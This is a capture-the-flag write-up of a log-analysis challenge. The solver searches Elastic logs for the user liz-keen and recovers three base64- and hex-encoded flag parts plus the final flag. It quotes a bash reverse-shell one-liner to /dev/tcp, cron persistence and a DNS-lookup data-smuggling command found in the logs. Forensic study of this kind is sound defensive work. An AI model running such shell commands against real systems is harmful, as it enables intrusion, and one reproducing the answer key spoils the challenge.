# E221

## Description

Our SOC was going into an audit session today, Miss liz-keen wanted to test our analysts threat hunting skills.
Can you help hunting the 3 parts of the flag?
Credentials: ctf-player:ctf-player

Author: 4NG3L

## Solution

- We are going to investigate a huge number of logs obtained using Elastic Search, the first think you will think to do is to see the users that had authenticated in this system, I thought that we need to take a look to the behavior of the user **liz-keen** 
- I tried to list the commands executed by this user ( `user.name: "liz-keen" and process.command_line: *` ), and I found the execution of a reverse shell multiple times ( `/bin/bash -c /bin/bash -i >& /dev/tcp/RED/1337 0>&1`) which confirms out doubts.
- I searched for some famous commands that would be executed by any attacker like ls, cat, find ... until I tried this query `user.name: "liz-keen" and process.command_line: *echo*`. The attacker tried here to execute some command after decoding it from base64 which was the first part of the flag also ( `/home/liz-keen/.../sh, -c, echo 'bmV4dXN7b2hfNG5BTHkkdF8'`)
- I noticed that the cron command is repeated a lot ( used to achieve persistence in the system ), I filtered by this command as it is very suspicious, after reducing the number of events that are meant to mislead us, and I got the third part of the flag: `crontab aW52M3NUSUc0dDNfUjNQMHJ0fQ`
- I tried other commands also, I thought about created files or dowloaded files, I filtered the events a little bit by execluding the misleading onces until I got a command that was trying to fetch something from a dns record of some domain, the second part of the flag was its **subdomain**: `nslookup 74494d336c314e655f71754552595f.reddington`

`nexus{oh_4nALy$t_tIM3l1Ne_quERY_inv3sTIG4t3_R3P0rt}`
